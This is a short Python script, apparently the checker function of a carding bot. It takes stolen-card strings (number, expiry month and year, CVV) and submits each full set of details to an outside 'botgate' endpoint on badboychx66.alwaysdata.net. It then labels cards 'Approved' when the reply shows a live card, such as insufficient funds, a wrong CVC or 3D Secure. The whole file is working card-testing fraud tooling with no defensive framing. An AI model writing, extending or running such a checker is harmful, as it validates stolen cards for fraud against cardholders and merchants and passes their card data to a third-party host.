import requests,re,random,time,string,base64
from bs4 import BeautifulSoup

def Tele(cx):
    # Split the input to extract card details
    cc = cx.split("|")[0]
    mes = cx.split("|")[1]
    ano = cx.split("|")[2]
    cvv = cx.split("|")[3]

    # Adjust the year format if it includes '20'
    if "20" in ano:
        ano = ano.split("20")[1]

    # Create a requests session
    r = requests.Session()

    # Headers for the request
    headers = {
        'authority': 'badboychx66.alwaysdata.net',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    # Format the request URL with card details
    url = f'https://badboychx66.alwaysdata.net/botgate/chk.php?lista={cc}|{mes}|{ano}|{cvv}'

    try:
        # Send the GET request
        response = r.get(url, headers=headers)
        response.raise_for_status()  # Raise an error for HTTP codes 4xx or 5xx
        result = response.text.strip()

        # Define the response structure
        if 'Approved' in result:
            es = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
            msg = "Approved"
        elif "Your card has insufficient funds." in result or "insufficient_funds" in result:
            es = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
            msg = "Your card has insufficient funds."
        elif "security code is incorrect." in result or "security code is invalid." in result or "incorrect_cvc" in result:
            es = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
            msg = "Security code is incorrect"
        elif "Your card does not support this type of purchase." in result:
            es = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
            msg = "Your card does not support this type of purchase."
        elif "stripe_3ds2_fingerprint" in result:
            es = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
            msg = "3D secured card"
        elif "card was declined." in result:
            es = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
            msg = "Card was declined."
        else:
            es = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
            msg = result

        # Return the formatted message
        return msg

    except requests.exceptions.RequestException as e:
        # Handle any request-related errors
        return f"Error: {e}"